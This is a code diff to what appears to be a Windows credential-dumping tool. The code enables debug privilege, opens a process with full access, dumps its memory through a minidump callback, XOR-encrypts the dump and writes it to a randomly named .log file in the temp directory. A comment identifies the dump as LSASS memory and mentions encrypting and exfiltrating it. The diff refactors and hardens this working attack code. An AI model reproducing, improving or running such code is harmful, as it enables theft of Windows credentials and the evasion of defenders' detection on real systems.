@@ -18,6 +18,25 @@ PVOID buffer = MHeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
 DWORD bytesRead = 0;
 
 
+size_t my_strlen(const char* str) {
+	size_t len = 0;
+	while (str[len] != '\0') {
+		len++;
+	}
+	return len;
+}
+
+
+void xorcrypt(char* content, size_t length, const char* secretKey, size_t keylen)
+{
+	for (size_t i = 0; i < length; i++)
+	{
+		content[i] ^= secretKey[i % keylen];
+	}
+
+}
+
+
 BOOL CALLBACK minidumpCallback(
 	__in     PVOID callbackParam,
 	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
@@ -120,6 +139,12 @@ void nt_callback(char* xorkey)
 	// enable debug privilege
 	MRtlAdjustPrivilege(20, TRUE, FALSE, &t);
 
+	if (PID == 0)
+	{
+		wprintf(L"[-] not find pid\n");
+		return;
+	}
+
 	lHandle = MOpenProcess(PROCESS_ALL_ACCESS, 0, PID);
 
 	// Set up minidump callback
@@ -133,14 +158,14 @@ void nt_callback(char* xorkey)
 
 	if (isD)
 	{
-		long int size = bytesRead;
-		char* securitySth = new char[size];
+		DWORD size = bytesRead;
+		char* encryptBuffer = new char[size];
 
-		memcpy(securitySth, buffer, bytesRead);
-		securitySth = Xorcrypt(securitySth, bytesRead, xorkey);
+		memcpy(encryptBuffer, buffer, size);
+		xorcrypt(encryptBuffer, size, xorkey, my_strlen(xorkey));
 
 		WCHAR logTempPath[MAX_PATH];
-		DWORD  dwRetVal = GetTempPath(MAX_PATH, logTempPath);
+		DWORD  dwRetVal = GetTempPathW(MAX_PATH, logTempPath);
 		if (dwRetVal == 0) {
 			wprintf(L"[-] Get temp path failure! \n");
 			wprintf(L"[+] Set the target directory to C:\\ProgramData\\ \n");
@@ -149,21 +174,24 @@ void nt_callback(char* xorkey)
 
 		WCHAR logFileName[MAX_PATH] = { 0 };
 		GenRandomStringW(logFileName, 12);
-		lstrcat(logTempPath, logFileName);
-		lstrcat(logTempPath, L".log");
+		lstrcatW(logTempPath, logFileName);
+		lstrcatW(logTempPath, L".log");
 		// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate
-		HANDLE outFile = CreateFile(logTempPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		HANDLE outFile = CreateFileW(logTempPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
-		if (WriteFile(outFile, securitySth, bytesRead, &bytesWritten, NULL))
+		if (WriteFile(outFile, encryptBuffer, size, &bytesWritten, NULL))
 		{
 			printf("[+] file xor crypt key: %s\n", xorkey);
-			wprintf(L"[+] save to %ls\n", logTempPath);
+			wprintf(L"[+] save to %ls (%lu)\n", logTempPath, size);
+			wprintf(L"[+] callbackdump finished.\n");
 		}
 		else
 		{
 			wprintf(L"[-] File can't write,  dump  failed! \n");
 		}
 		CloseHandle(outFile);
+
+		delete[] encryptBuffer;
 	}
 	else
 	{
